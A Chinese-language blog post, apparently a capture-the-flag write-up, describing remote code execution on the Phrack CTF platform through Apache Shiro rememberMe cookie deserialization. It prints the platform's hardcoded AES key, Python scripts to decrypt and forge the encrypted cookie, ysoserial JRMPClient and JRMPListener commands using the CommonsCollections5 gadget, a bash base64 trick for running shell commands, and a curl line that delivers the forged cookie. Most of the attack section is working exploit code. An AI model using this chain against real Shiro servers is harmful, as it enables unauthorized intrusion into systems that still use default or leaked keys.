---
layout: post
title: Phrack CTF Platform RCE
category: 抛砖引玉
tags: Phrack RCE
description:
---

## 0x00 start.

强网杯的一道题看师傅们做了但是没有细节.是shiro没有及时更新存在反序列漏洞最后RCE.
在本文章发布的时候，作者已经修复.
需要的知识：
`https://paper.seebug.org/shiro-rememberme-1-2-4/`
`https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html`
`http://blog.orange.tw/201803pwn-ctf-platform-with-java-jrmp-gadget.html`
`http://blog.knownsec.com/2016/08/apache-shiro-java/`

## 0x01 do it.
 - rememberMe cookie
 - CookieRememberMeManager.java
 - Base64
 - AES
 - 加密密钥硬编码
 - Java serialization

我们要做的就是先解码在解密,默认的KEY在这.
AES KEY 
```
path: src/main/resources/spring-shiro.xml
value="#{T(org.apache.shiro.codec.Base64).decode('cGhyYWNrY3RmREUhfiMkZA==')}"/>
```
然后再把cookie 中的rememberMe 字段的值解码之后在解密。
```
#pip install pycrypto
import sys
import base64
from Crypto.Cipher import AES
def decode_rememberme_file(filename,key):
    with open(filename, 'rb') as fpr:
        mode =  AES.MODE_CBC
        IV   = b' ' * 16
        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)
        remember_bin = encryptor.decrypt(fpr.read())
    return remember_bin
if __name__ == '__main__':
	print decode_rememberme_file('./code',sys.argv[1])
```

![Screen Shot 2018-03-28 at 5.51.06 PM.png][1]


第二行ac ed存在.

## 0x02 构造payload
然后在文章[Apache Shiro Java 反序列化漏洞分析][2]中已经详细的分析过触发点.Apache Shiro自己实现了一个ClassLoader导致了无法像文章里面直接用gadget,然后使用了`ysoserial.exploit.JRMPListener`和JRMPClient构造payload.

加密脚本
```
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES
import sys

def encode_rememberme():

    payload = sys.stdin.read()
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "cGhyYWNrY3RmREUhfiMkZA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(payload)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme()    
    print("rememberMe={}".format(payload.decode()))
```


![Screen Shot 2018-03-28 at 6.06.02 PM.png][3]

```java -jar ysoserial.jar JRMPClient '1.2.3.4:1234' | python exp1.py```

![Screen Shot 2018-03-28 at 6.06.55 PM.png][4]

```java -cp ysoserial.jar  ysoserial.exploit.JRMPListener 1234 CommonsCollections5 "osshell"```

执行curl 发现有返回,但是在构造的时候发现传入空格的时候发现ysoserial的gadget不支持传入数组.于是构造`bash -c {echo,base64编码之后}|{base64,-d}|{bash,-i}`
在次生成payload

```
curl http://1.2.3.4:8080/home -H "Cookie:`java -jar ysoserial.jar JRMPClient '1.2.3.4:1234' | python exp1.py`"  > /dev/null
```



  [1]: https://img.scanfsec.com/img/2018032116386612.png
  [2]: http://blog.knownsec.com/2016/08/apache-shiro-java/
  [3]: https://img.scanfsec.com/img/2018033439134614.png
  [4]: https://img.scanfsec.com/img/2018031403773920.png
